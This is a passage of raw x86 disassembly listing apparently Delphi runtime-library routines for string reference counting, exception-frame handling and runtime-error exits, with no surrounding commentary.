  402fd7:	eb 2c                	jmp    0x403005
  402fd9:	b0 c8                	mov    $0xc8,%al
  402fdb:	eb 2a                	jmp    0x403007
  402fdd:	b0 c9                	mov    $0xc9,%al
  402fdf:	eb 26                	jmp    0x403007
  402fe1:	b0 cd                	mov    $0xcd,%al
  402fe3:	eb 22                	jmp    0x403007
  402fe5:	b0 cf                	mov    $0xcf,%al
  402fe7:	eb 1e                	jmp    0x403007
  402fe9:	b0 c8                	mov    $0xc8,%al
  402feb:	eb 1a                	jmp    0x403007
  402fed:	b0 d7                	mov    $0xd7,%al
  402fef:	eb 16                	jmp    0x403007
  402ff1:	b0 ce                	mov    $0xce,%al
  402ff3:	eb 12                	jmp    0x403007
  402ff5:	b0 d8                	mov    $0xd8,%al
  402ff7:	eb 0e                	jmp    0x403007
  402ff9:	b0 da                	mov    $0xda,%al
  402ffb:	eb 0a                	jmp    0x403007
  402ffd:	b0 d9                	mov    $0xd9,%al
  402fff:	eb 06                	jmp    0x403007
  403001:	b0 ca                	mov    $0xca,%al
  403003:	eb 02                	jmp    0x403007
  403005:	b0 d9                	mov    $0xd9,%al
  403007:	25 ff 00 00 00       	and    $0xff,%eax
  40300c:	8b 52 0c             	mov    0xc(%edx),%edx
  40300f:	e8 58 ff ff ff       	call   0x402f6c
  403014:	5d                   	pop    %ebp
  403015:	c2 04 00             	ret    $0x4
  403018:	8b 44 24 04          	mov    0x4(%esp),%eax
  40301c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403023:	75 6b                	jne    0x403090
  403025:	e8 32 f8 ff ff       	call   0x40285c
  40302a:	8b 54 24 08          	mov    0x8(%esp),%edx
  40302e:	6a 00                	push   $0x0
  403030:	50                   	push   %eax
  403031:	68 3c 30 40 00       	push   $0x40303c
  403036:	52                   	push   %edx
  403037:	e8 90 e1 ff ff       	call   0x4011cc
  40303c:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  403040:	81 3b ce fa ed 0e    	cmpl   $0xeedface,(%ebx)
  403046:	8b 53 14             	mov    0x14(%ebx),%edx
  403049:	8b 43 18             	mov    0x18(%ebx),%eax
  40304c:	74 1d                	je     0x40306b
  40304e:	8b 15 0c b0 40 00    	mov    0x40b00c,%edx
  403054:	85 d2                	test   %edx,%edx
  403056:	0f 84 1c ff ff ff    	je     0x402f78
  40305c:	89 d8                	mov    %ebx,%eax
  40305e:	ff d2                	call   *%edx
  403060:	85 c0                	test   %eax,%eax
  403062:	0f 84 10 ff ff ff    	je     0x402f78
  403068:	8b 53 0c             	mov    0xc(%ebx),%edx
  40306b:	e8 78 fb ff ff       	call   0x402be8
  403070:	8b 0d 00 b0 40 00    	mov    0x40b000,%ecx
  403076:	85 c9                	test   %ecx,%ecx
  403078:	74 02                	je     0x40307c
  40307a:	ff d1                	call   *%ecx
  40307c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403080:	b8 d9 00 00 00       	mov    $0xd9,%eax
  403085:	8b 51 14             	mov    0x14(%ecx),%edx
  403088:	89 14 24             	mov    %edx,(%esp)
  40308b:	e9 b1 0d 00 00       	jmp    0x403e41
  403090:	31 c0                	xor    %eax,%eax
  403092:	c3                   	ret
  403093:	90                   	nop
  403094:	31 d2                	xor    %edx,%edx
  403096:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403099:	64 8b 0a             	mov    %fs:(%edx),%ecx
  40309c:	64 89 02             	mov    %eax,%fs:(%edx)
  40309f:	89 08                	mov    %ecx,(%eax)
  4030a1:	c7 40 04 18 30 40 00 	movl   $0x403018,0x4(%eax)
  4030a8:	89 68 08             	mov    %ebp,0x8(%eax)
  4030ab:	89 05 88 b4 40 00    	mov    %eax,0x40b488
  4030b1:	c3                   	ret
  4030b2:	8b c0                	mov    %eax,%eax
  4030b4:	31 d2                	xor    %edx,%edx
  4030b6:	8b 05 88 b4 40 00    	mov    0x40b488,%eax
  4030bc:	64 8b 0a             	mov    %fs:(%edx),%ecx
  4030bf:	39 c8                	cmp    %ecx,%eax
  4030c1:	75 08                	jne    0x4030cb
  4030c3:	8b 00                	mov    (%eax),%eax
  4030c5:	64 89 02             	mov    %eax,%fs:(%edx)
  4030c8:	c3                   	ret
  4030c9:	8b 09                	mov    (%ecx),%ecx
  4030cb:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4030ce:	74 08                	je     0x4030d8
  4030d0:	39 01                	cmp    %eax,(%ecx)
  4030d2:	75 f5                	jne    0x4030c9
  4030d4:	8b 00                	mov    (%eax),%eax
  4030d6:	89 01                	mov    %eax,(%ecx)
  4030d8:	c3                   	ret
  4030d9:	8d 40 00             	lea    0x0(%eax),%eax
  4030dc:	e8 b3 ff ff ff       	call   0x403094
  4030e1:	6a 00                	push   $0x0
  4030e3:	e8 14 e1 ff ff       	call   0x4011fc
  4030e8:	89 05 14 b0 40 00    	mov    %eax,0x40b014
  4030ee:	e8 f9 e0 ff ff       	call   0x4011ec
  4030f3:	89 05 1c b0 40 00    	mov    %eax,0x40b01c
  4030f9:	c7 05 18 b0 40 00 0a 	movl   $0xa,0x40b018
  403100:	00 00 00 
  403103:	b8 34 2e 40 00       	mov    $0x402e34,%eax
  403108:	c3                   	ret
  403109:	8d 40 00             	lea    0x0(%eax),%eax
  40310c:	53                   	push   %ebx
  40310d:	83 3d d0 b3 40 00 00 	cmpl   $0x0,0x40b3d0
  403114:	7d 0a                	jge    0x403120
  403116:	b8 e2 00 00 00       	mov    $0xe2,%eax
  40311b:	e8 21 0d 00 00       	call   0x403e41
  403120:	68 08 00 00 00       	push   $0x8
  403125:	6a 40                	push   $0x40
  403127:	e8 20 e1 ff ff       	call   0x40124c
  40312c:	8b d8                	mov    %eax,%ebx
  40312e:	85 db                	test   %ebx,%ebx
  403130:	75 0c                	jne    0x40313e
  403132:	b8 e2 00 00 00       	mov    $0xe2,%eax
  403137:	e8 05 0d 00 00       	call   0x403e41
  40313c:	eb 0c                	jmp    0x40314a
  40313e:	53                   	push   %ebx
  40313f:	a1 d0 b3 40 00       	mov    0x40b3d0,%eax
  403144:	50                   	push   %eax
  403145:	e8 ca e0 ff ff       	call   0x401214
  40314a:	89 1d 8c b4 40 00    	mov    %ebx,0x40b48c
  403150:	5b                   	pop    %ebx
  403151:	c3                   	ret
  403152:	8b c0                	mov    %eax,%eax
  403154:	8a 0d 30 b0 40 00    	mov    0x40b030,%cl
  40315a:	8b 05 d0 b3 40 00    	mov    0x40b3d0,%eax
  403160:	84 c9                	test   %cl,%cl
  403162:	75 28                	jne    0x40318c
  403164:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  40316b:	8b 04 82             	mov    (%edx,%eax,4),%eax
  40316e:	c3                   	ret
  40316f:	e8 98 ff ff ff       	call   0x40310c
  403174:	8b 05 d0 b3 40 00    	mov    0x40b3d0,%eax
  40317a:	50                   	push   %eax
  40317b:	e8 8c e0 ff ff       	call   0x40120c
  403180:	85 c0                	test   %eax,%eax
  403182:	74 01                	je     0x403185
  403184:	c3                   	ret
  403185:	8b 05 8c b4 40 00    	mov    0x40b48c,%eax
  40318b:	c3                   	ret
  40318c:	50                   	push   %eax
  40318d:	e8 7a e0 ff ff       	call   0x40120c
  403192:	85 c0                	test   %eax,%eax
  403194:	74 d9                	je     0x40316f
  403196:	c3                   	ret
  403197:	90                   	nop
  403198:	8b 10                	mov    (%eax),%edx
  40319a:	85 d2                	test   %edx,%edx
  40319c:	74 19                	je     0x4031b7
  40319e:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4031a4:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031a7:	49                   	dec    %ecx
  4031a8:	7c 0d                	jl     0x4031b7
  4031aa:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4031ad:	75 08                	jne    0x4031b7
  4031af:	8d 42 f8             	lea    -0x8(%edx),%eax
  4031b2:	e8 f5 f3 ff ff       	call   0x4025ac
  4031b7:	c3                   	ret
  4031b8:	53                   	push   %ebx
  4031b9:	56                   	push   %esi
  4031ba:	89 c3                	mov    %eax,%ebx
  4031bc:	89 d6                	mov    %edx,%esi
  4031be:	8b 13                	mov    (%ebx),%edx
  4031c0:	85 d2                	test   %edx,%edx
  4031c2:	74 19                	je     0x4031dd
  4031c4:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4031ca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031cd:	49                   	dec    %ecx
  4031ce:	7c 0d                	jl     0x4031dd
  4031d0:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4031d3:	75 08                	jne    0x4031dd
  4031d5:	8d 42 f8             	lea    -0x8(%edx),%eax
  4031d8:	e8 cf f3 ff ff       	call   0x4025ac
  4031dd:	83 c3 04             	add    $0x4,%ebx
  4031e0:	4e                   	dec    %esi
  4031e1:	75 db                	jne    0x4031be
  4031e3:	5e                   	pop    %esi
  4031e4:	5b                   	pop    %ebx
  4031e5:	c3                   	ret
  4031e6:	8b c0                	mov    %eax,%eax
  4031e8:	85 d2                	test   %edx,%edx
  4031ea:	74 23                	je     0x40320f
  4031ec:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031ef:	41                   	inc    %ecx
  4031f0:	7f 1a                	jg     0x40320c
  4031f2:	50                   	push   %eax
  4031f3:	52                   	push   %edx
  4031f4:	8b 42 fc             	mov    -0x4(%edx),%eax
  4031f7:	e8 58 00 00 00       	call   0x403254
  4031fc:	89 c2                	mov    %eax,%edx
  4031fe:	58                   	pop    %eax
  4031ff:	52                   	push   %edx
  403200:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403203:	e8 7c f4 ff ff       	call   0x402684
  403208:	5a                   	pop    %edx
  403209:	58                   	pop    %eax
  40320a:	eb 03                	jmp    0x40320f
  40320c:	89 4a f8             	mov    %ecx,-0x8(%edx)
  40320f:	87 10                	xchg   %edx,(%eax)
  403211:	85 d2                	test   %edx,%edx
  403213:	74 13                	je     0x403228
  403215:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403218:	49                   	dec    %ecx
  403219:	7c 0d                	jl     0x403228
  40321b:	89 4a f8             	mov    %ecx,-0x8(%edx)
  40321e:	75 08                	jne    0x403228
  403220:	8d 42 f8             	lea    -0x8(%edx),%eax
  403223:	e8 84 f3 ff ff       	call   0x4025ac
  403228:	c3                   	ret
  403229:	8d 40 00             	lea    0x0(%eax),%eax
  40322c:	85 d2                	test   %edx,%edx
  40322e:	74 09                	je     0x403239
  403230:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403233:	41                   	inc    %ecx
  403234:	7e 03                	jle    0x403239
  403236:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403239:	87 10                	xchg   %edx,(%eax)
  40323b:	85 d2                	test   %edx,%edx
  40323d:	74 13                	je     0x403252
  40323f:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403242:	49                   	dec    %ecx
  403243:	7c 0d                	jl     0x403252
  403245:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403248:	75 08                	jne    0x403252
  40324a:	8d 42 f8             	lea    -0x8(%edx),%eax
  40324d:	e8 5a f3 ff ff       	call   0x4025ac
  403252:	c3                   	ret
  403253:	90                   	nop
  403254:	85 c0                	test   %eax,%eax
  403256:	7e 1c                	jle    0x403274
  403258:	50                   	push   %eax
  403259:	83 c0 09             	add    $0x9,%eax
  40325c:	e8 33 f3 ff ff       	call   0x402594
  403261:	83 c0 08             	add    $0x8,%eax
  403264:	5a                   	pop    %edx
  403265:	89 50 fc             	mov    %edx,-0x4(%eax)
  403268:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  40326f:	c6 04 10 00          	movb   $0x0,(%eax,%edx,1)
  403273:	c3                   	ret
  403274:	31 c0                	xor    %eax,%eax
  403276:	c3                   	ret
  403277:	90                   	nop
  403278:	53                   	push   %ebx
  403279:	56                   	push   %esi
  40327a:	57                   	push   %edi
  40327b:	89 c3                	mov    %eax,%ebx
  40327d:	89 d6                	mov    %edx,%esi
  40327f:	89 cf                	mov    %ecx,%edi
  403281:	89 f8                	mov    %edi,%eax
  403283:	e8 cc ff ff ff       	call   0x403254
  403288:	89 f9                	mov    %edi,%ecx
  40328a:	89 c7                	mov    %eax,%edi
  40328c:	85 f6                	test   %esi,%esi
  40328e:	74 09                	je     0x403299
  403290:	89 c2                	mov    %eax,%edx
  403292:	89 f0                	mov    %esi,%eax
  403294:	e8 eb f3 ff ff       	call   0x402684
  403299:	89 d8                	mov    %ebx,%eax
  40329b:	e8 f8 fe ff ff       	call   0x403198
  4032a0:	89 3b                	mov    %edi,(%ebx)
  4032a2:	5f                   	pop    %edi
  4032a3:	5e                   	pop    %esi
  4032a4:	5b                   	pop    %ebx
  4032a5:	c3                   	ret
  4032a6:	8b c0                	mov    %eax,%eax
  4032a8:	52                   	push   %edx
  4032a9:	89 e2                	mov    %esp,%edx
  4032ab:	b9 01 00 00 00       	mov    $0x1,%ecx
  4032b0:	e8 c3 ff ff ff       	call   0x403278
  4032b5:	5a                   	pop    %edx
  4032b6:	c3                   	ret
  4032b7:	90                   	nop
  4032b8:	31 c9                	xor    %ecx,%ecx
  4032ba:	8a 0a                	mov    (%edx),%cl
  4032bc:	42                   	inc    %edx
  4032bd:	e8 b6 ff ff ff       	call   0x403278
  4032c2:	c3                   	ret
  4032c3:	90                   	nop
  4032c4:	31 c9                	xor    %ecx,%ecx
  4032c6:	85 d2                	test   %edx,%edx
  4032c8:	74 21                	je     0x4032eb
  4032ca:	52                   	push   %edx
  4032cb:	3a 0a                	cmp    (%edx),%cl
  4032cd:	74 17                	je     0x4032e6
  4032cf:	3a 4a 01             	cmp    0x1(%edx),%cl
  4032d2:	74 11                	je     0x4032e5
  4032d4:	3a 4a 02             	cmp    0x2(%edx),%cl
  4032d7:	74 0b                	je     0x4032e4
  4032d9:	3a 4a 03             	cmp    0x3(%edx),%cl
  4032dc:	74 05                	je     0x4032e3
  4032de:	83 c2 04             	add    $0x4,%edx
  4032e1:	eb e8                	jmp    0x4032cb
  4032e3:	42                   	inc    %edx
  4032e4:	42                   	inc    %edx
  4032e5:	42                   	inc    %edx
  4032e6:	89 d1                	mov    %edx,%ecx
  4032e8:	5a                   	pop    %edx
  4032e9:	29 d1                	sub    %edx,%ecx
  4032eb:	e9 88 ff ff ff       	jmp    0x403278
  4032f0:	c3                   	ret
  4032f1:	8d 40 00             	lea    0x0(%eax),%eax
  4032f4:	85 c0                	test   %eax,%eax
  4032f6:	74 03                	je     0x4032fb
  4032f8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4032fb:	c3                   	ret
  4032fc:	85 d2                	test   %edx,%edx
  4032fe:	74 3f                	je     0x40333f
  403300:	8b 08                	mov    (%eax),%ecx
  403302:	85 c9                	test   %ecx,%ecx
  403304:	0f 84 de fe ff ff    	je     0x4031e8
  40330a:	53                   	push   %ebx
  40330b:	56                   	push   %esi
  40330c:	57                   	push   %edi
  40330d:	89 c3                	mov    %eax,%ebx
  40330f:	89 d6                	mov    %edx,%esi
  403311:	8b 79 fc             	mov    -0x4(%ecx),%edi
  403314:	8b 56 fc             	mov    -0x4(%esi),%edx
  403317:	01 fa                	add    %edi,%edx
  403319:	39 ce                	cmp    %ecx,%esi
  40331b:	74 17                	je     0x403334
  40331d:	e8 ce 01 00 00       	call   0x4034f0
  403322:	89 f0                	mov    %esi,%eax
  403324:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403327:	8b 13                	mov    (%ebx),%edx
  403329:	01 fa                	add    %edi,%edx
  40332b:	e8 54 f3 ff ff       	call   0x402684
  403330:	5f                   	pop    %edi
  403331:	5e                   	pop    %esi
  403332:	5b                   	pop    %ebx
  403333:	c3                   	ret
  403334:	e8 b7 01 00 00       	call   0x4034f0
  403339:	8b 03                	mov    (%ebx),%eax
  40333b:	89 f9                	mov    %edi,%ecx
  40333d:	eb e8                	jmp    0x403327
  40333f:	c3                   	ret
  403340:	85 d2                	test   %edx,%edx
  403342:	74 61                	je     0x4033a5
  403344:	85 c9                	test   %ecx,%ecx
  403346:	0f 84 9c fe ff ff    	je     0x4031e8
  40334c:	3b 10                	cmp    (%eax),%edx
  40334e:	74 5c                	je     0x4033ac
  403350:	3b 08                	cmp    (%eax),%ecx
  403352:	74 0e                	je     0x403362
  403354:	50                   	push   %eax
  403355:	51                   	push   %ecx
  403356:	e8 8d fe ff ff       	call   0x4031e8
  40335b:	5a                   	pop    %edx
  40335c:	58                   	pop    %eax
  40335d:	e9 9a ff ff ff       	jmp    0x4032fc
  403362:	53                   	push   %ebx
  403363:	56                   	push   %esi
  403364:	57                   	push   %edi
  403365:	89 d3                	mov    %edx,%ebx
  403367:	89 ce                	mov    %ecx,%esi
  403369:	50                   	push   %eax
  40336a:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40336d:	03 46 fc             	add    -0x4(%esi),%eax
  403370:	e8 df fe ff ff       	call   0x403254
  403375:	89 c7                	mov    %eax,%edi
  403377:	89 c2                	mov    %eax,%edx
  403379:	89 d8                	mov    %ebx,%eax
  40337b:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  40337e:	e8 01 f3 ff ff       	call   0x402684
  403383:	89 fa                	mov    %edi,%edx
  403385:	89 f0                	mov    %esi,%eax
  403387:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40338a:	03 53 fc             	add    -0x4(%ebx),%edx
  40338d:	e8 f2 f2 ff ff       	call   0x402684
  403392:	58                   	pop    %eax
  403393:	89 fa                	mov    %edi,%edx
  403395:	85 ff                	test   %edi,%edi
  403397:	74 03                	je     0x40339c
  403399:	ff 4f f8             	decl   -0x8(%edi)
  40339c:	e8 47 fe ff ff       	call   0x4031e8
  4033a1:	5f                   	pop    %edi
  4033a2:	5e                   	pop    %esi
  4033a3:	5b                   	pop    %ebx
  4033a4:	c3                   	ret
  4033a5:	89 ca                	mov    %ecx,%edx
  4033a7:	e9 3c fe ff ff       	jmp    0x4031e8
  4033ac:	89 ca                	mov    %ecx,%edx
  4033ae:	e9 49 ff ff ff       	jmp    0x4032fc
  4033b3:	c3                   	ret
  4033b4:	53                   	push   %ebx
  4033b5:	56                   	push   %esi
  4033b6:	52                   	push   %edx
  4033b7:	50                   	push   %eax
  4033b8:	89 d3                	mov    %edx,%ebx
  4033ba:	31 c0                	xor    %eax,%eax
  4033bc:	8b 4c 94 10          	mov    0x10(%esp,%edx,4),%ecx
  4033c0:	85 c9                	test   %ecx,%ecx
  4033c2:	74 03                	je     0x4033c7
  4033c4:	03 41 fc             	add    -0x4(%ecx),%eax
  4033c7:	4a                   	dec    %edx
  4033c8:	75 f2                	jne    0x4033bc
  4033ca:	e8 85 fe ff ff       	call   0x403254
  4033cf:	50                   	push   %eax
  4033d0:	89 c6                	mov    %eax,%esi
  4033d2:	8b 44 9c 14          	mov    0x14(%esp,%ebx,4),%eax
  4033d6:	89 f2                	mov    %esi,%edx
  4033d8:	85 c0                	test   %eax,%eax
  4033da:	74 0a                	je     0x4033e6
  4033dc:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4033df:	01 ce                	add    %ecx,%esi
  4033e1:	e8 9e f2 ff ff       	call   0x402684
  4033e6:	4b                   	dec    %ebx
  4033e7:	75 e9                	jne    0x4033d2
  4033e9:	5a                   	pop    %edx
  4033ea:	58                   	pop    %eax
  4033eb:	85 d2                	test   %edx,%edx
  4033ed:	74 03                	je     0x4033f2
  4033ef:	ff 4a f8             	decl   -0x8(%edx)
  4033f2:	e8 f1 fd ff ff       	call   0x4031e8
  4033f7:	5a                   	pop    %edx
  4033f8:	5e                   	pop    %esi
  4033f9:	5b                   	pop    %ebx
  4033fa:	58                   	pop    %eax
  4033fb:	8d 24 94             	lea    (%esp,%edx,4),%esp
  4033fe:	ff e0                	jmp    *%eax
  403400:	c3                   	ret
  403401:	8d 40 00             	lea    0x0(%eax),%eax
  403404:	85 c0                	test   %eax,%eax
  403406:	74 09                	je     0x403411
  403408:	8b 50 f8             	mov    -0x8(%eax),%edx
  40340b:	42                   	inc    %edx
  40340c:	7e 03                	jle    0x403411
  40340e:	89 50 f8             	mov    %edx,-0x8(%eax)
  403411:	c3                   	ret
  403412:	8b c0                	mov    %eax,%eax
  403414:	85 c0                	test   %eax,%eax
  403416:	74 02                	je     0x40341a
  403418:	c3                   	ret
  403419:	00 b8 19 34 40 00    	add    %bh,0x403419(%eax)
  40341f:	c3                   	ret
  403420:	8b 10                	mov    (%eax),%edx
  403422:	85 d2                	test   %edx,%edx
  403424:	74 2b                	je     0x403451
  403426:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403429:	49                   	dec    %ecx
  40342a:	74 25                	je     0x403451
  40342c:	53                   	push   %ebx
  40342d:	89 c3                	mov    %eax,%ebx
  40342f:	8b 42 fc             	mov    -0x4(%edx),%eax
  403432:	e8 1d fe ff ff       	call   0x403254
  403437:	89 c2                	mov    %eax,%edx
  403439:	8b 03                	mov    (%ebx),%eax
  40343b:	89 13                	mov    %edx,(%ebx)
  40343d:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403440:	49                   	dec    %ecx
  403441:	7c 03                	jl     0x403446
  403443:	89 48 f8             	mov    %ecx,-0x8(%eax)
  403446:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403449:	e8 36 f2 ff ff       	call   0x402684
  40344e:	8b 13                	mov    (%ebx),%edx
  403450:	5b                   	pop    %ebx
  403451:	89 d0                	mov    %edx,%eax
  403453:	c3                   	ret
  403454:	53                   	push   %ebx
  403455:	85 c0                	test   %eax,%eax
  403457:	74 2d                	je     0x403486
  403459:	8b 58 fc             	mov    -0x4(%eax),%ebx
  40345c:	85 db                	test   %ebx,%ebx
  40345e:	74 26                	je     0x403486
  403460:	4a                   	dec    %edx
  403461:	7c 1b                	jl     0x40347e
  403463:	39 da                	cmp    %ebx,%edx
  403465:	7d 1f                	jge    0x403486
  403467:	29 d3                	sub    %edx,%ebx
  403469:	85 c9                	test   %ecx,%ecx
  40346b:	7c 19                	jl     0x403486
  40346d:	39 d9                	cmp    %ebx,%ecx
  40346f:	7f 11                	jg     0x403482
  403471:	01 c2                	add    %eax,%edx
  403473:	8b 44 24 08          	mov    0x8(%esp),%eax
  403477:	e8 fc fd ff ff       	call   0x403278
  40347c:	eb 11                	jmp    0x40348f
  40347e:	31 d2                	xor    %edx,%edx
  403480:	eb e5                	jmp    0x403467
  403482:	89 d9                	mov    %ebx,%ecx
  403484:	eb eb                	jmp    0x403471
  403486:	8b 44 24 08          	mov    0x8(%esp),%eax
  40348a:	e8 09 fd ff ff       	call   0x403198
  40348f:	5b                   	pop    %ebx
  403490:	c2 04 00             	ret    $0x4
  403493:	c3                   	ret
  403494:	85 c0                	test   %eax,%eax
  403496:	74 56                	je     0x4034ee
  403498:	53                   	push   %ebx
  403499:	56                   	push   %esi
  40349a:	57                   	push   %edi
  40349b:	55                   	push   %ebp
  40349c:	89 c3                	mov    %eax,%ebx
  40349e:	89 d6                	mov    %edx,%esi
  4034a0:	89 cf                	mov    %ecx,%edi
  4034a2:	8b 12                	mov    (%edx),%edx
  4034a4:	52                   	push   %edx
  4034a5:	85 d2                	test   %edx,%edx
  4034a7:	74 03                	je     0x4034ac
  4034a9:	8b 52 fc             	mov    -0x4(%edx),%edx
  4034ac:	4f                   	dec    %edi
  4034ad:	7d 02                	jge    0x4034b1
  4034af:	31 ff                	xor    %edi,%edi
  4034b1:	39 d7                	cmp    %edx,%edi
  4034b3:	7e 02                	jle    0x4034b7
  4034b5:	89 d7                	mov    %edx,%edi
  4034b7:	8b 6b fc             	mov    -0x4(%ebx),%ebp
  4034ba:	89 f0                	mov    %esi,%eax
  4034bc:	01 ea                	add    %ebp,%edx
  4034be:	e8 2d 00 00 00       	call   0x4034f0
  4034c3:	58                   	pop    %eax
  4034c4:	39 d8                	cmp    %ebx,%eax
  4034c6:	75 02                	jne    0x4034ca
  4034c8:	8b 1e                	mov    (%esi),%ebx
  4034ca:	8b 06                	mov    (%esi),%eax
  4034cc:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  4034cf:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4034d2:	29 d1                	sub    %edx,%ecx
  4034d4:	01 c2                	add    %eax,%edx
  4034d6:	01 f8                	add    %edi,%eax
  4034d8:	e8 a7 f1 ff ff       	call   0x402684
  4034dd:	89 d8                	mov    %ebx,%eax
  4034df:	8b 16                	mov    (%esi),%edx
  4034e1:	89 e9                	mov    %ebp,%ecx
  4034e3:	01 fa                	add    %edi,%edx
  4034e5:	e8 9a f1 ff ff       	call   0x402684
  4034ea:	5d                   	pop    %ebp
  4034eb:	5f                   	pop    %edi
  4034ec:	5e                   	pop    %esi
  4034ed:	5b                   	pop    %ebx
  4034ee:	c3                   	ret
  4034ef:	90                   	nop
  4034f0:	53                   	push   %ebx
  4034f1:	56                   	push   %esi
  4034f2:	57                   	push   %edi
  4034f3:	89 c3                	mov    %eax,%ebx
  4034f5:	89 d6                	mov    %edx,%esi
  4034f7:	31 ff                	xor    %edi,%edi
  4034f9:	85 d2                	test   %edx,%edx
  4034fb:	74 48                	je     0x403545
  4034fd:	8b 03                	mov    (%ebx),%eax
  4034ff:	85 c0                	test   %eax,%eax
  403501:	74 23                	je     0x403526
  403503:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  403507:	75 1d                	jne    0x403526
  403509:	83 e8 08             	sub    $0x8,%eax
  40350c:	83 c2 09             	add    $0x9,%edx
  40350f:	50                   	push   %eax
  403510:	89 e0                	mov    %esp,%eax
  403512:	e8 ad f0 ff ff       	call   0x4025c4
  403517:	58                   	pop    %eax
  403518:	83 c0 08             	add    $0x8,%eax
  40351b:	89 03                	mov    %eax,(%ebx)
  40351d:	89 70 fc             	mov    %esi,-0x4(%eax)
  403520:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  403524:	eb 28                	jmp    0x40354e
  403526:	89 d0                	mov    %edx,%eax
  403528:	e8 27 fd ff ff       	call   0x403254
  40352d:	89 c7                	mov    %eax,%edi
  40352f:	8b 03                	mov    (%ebx),%eax
  403531:	85 c0                	test   %eax,%eax
  403533:	74 10                	je     0x403545
  403535:	89 fa                	mov    %edi,%edx
  403537:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40353a:	39 f1                	cmp    %esi,%ecx
  40353c:	7c 02                	jl     0x403540
  40353e:	89 f1                	mov    %esi,%ecx
  403540:	e8 3f f1 ff ff       	call   0x402684
  403545:	89 d8                	mov    %ebx,%eax
  403547:	e8 4c fc ff ff       	call   0x403198
  40354c:	89 3b                	mov    %edi,(%ebx)
  40354e:	5f                   	pop    %edi
  40354f:	5e                   	pop    %esi
  403550:	5b                   	pop    %ebx
  403551:	c3                   	ret
  403552:	8b c0                	mov    %eax,%eax
  403554:	31 c9                	xor    %ecx,%ecx
  403556:	53                   	push   %ebx
  403557:	8a 4a 01             	mov    0x1(%edx),%cl
  40355a:	56                   	push   %esi
  40355b:	57                   	push   %edi
  40355c:	89 c3                	mov    %eax,%ebx
  40355e:	8d 74 0a 0a          	lea    0xa(%edx,%ecx,1),%esi
  403562:	8b 7c 0a 06          	mov    0x6(%edx,%ecx,1),%edi
  403566:	8b 46 04             	mov    0x4(%esi),%eax
  403569:	8b 16                	mov    (%esi),%edx
  40356b:	01 d8                	add    %ebx,%eax
  40356d:	e8 92 00 00 00       	call   0x403604
  403572:	83 c6 08             	add    $0x8,%esi
  403575:	4f                   	dec    %edi
  403576:	7f ee                	jg     0x403566
  403578:	5f                   	pop    %edi
  403579:	5e                   	pop    %esi
  40357a:	5b                   	pop    %ebx
  40357b:	c3                   	ret
  40357c:	53                   	push   %ebx
  40357d:	56                   	push   %esi
  40357e:	57                   	push   %edi
  40357f:	89 c3                	mov    %eax,%ebx
  403581:	89 d6                	mov    %edx,%esi
  403583:	89 cf                	mov    %ecx,%edi
  403585:	31 d2                	xor    %edx,%edx
  403587:	8a 06                	mov    (%esi),%al
  403589:	8a 56 01             	mov    0x1(%esi),%dl
  40358c:	80 f8 0a             	cmp    $0xa,%al
  40358f:	74 19                	je     0x4035aa
  403591:	80 f8 0c             	cmp    $0xc,%al
  403594:	74 2b                	je     0x4035c1
  403596:	80 f8 0d             	cmp    $0xd,%al
  403599:	74 35                	je     0x4035d0
  40359b:	80 f8 0e             	cmp    $0xe,%al
  40359e:	74 4c                	je     0x4035ec
  4035a0:	b0 02                	mov    $0x2,%al
  4035a2:	5f                   	pop    %edi
  4035a3:	5e                   	pop    %esi
  4035a4:	5b                   	pop    %ebx
  4035a5:	e9 6a f0 ff ff       	jmp    0x402614
  4035aa:	83 f9 01             	cmp    $0x1,%ecx
  4035ad:	89 d8                	mov    %ebx,%eax
  4035af:	7f 07                	jg     0x4035b8
  4035b1:	e8 e2 fb ff ff       	call   0x403198
  4035b6:	eb 48                	jmp    0x403600
  4035b8:	89 ca                	mov    %ecx,%edx
  4035ba:	e8 f9 fb ff ff       	call   0x4031b8
  4035bf:	eb 3f                	jmp    0x403600
  4035c1:	89 d8                	mov    %ebx,%eax
  4035c3:	83 c3 10             	add    $0x10,%ebx
  4035c6:	e8 15 04 00 00       	call   0x4039e0
  4035cb:	4f                   	dec    %edi
  4035cc:	7f f3                	jg     0x4035c1
  4035ce:	eb 30                	jmp    0x403600
  4035d0:	55                   	push   %ebp
  4035d1:	89 d5                	mov    %edx,%ebp
  4035d3:	89 d8                	mov    %ebx,%eax
  4035d5:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4035d9:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4035dd:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4035e1:	e8 96 ff ff ff       	call   0x40357c
  4035e6:	4f                   	dec    %edi
  4035e7:	7f ea                	jg     0x4035d3
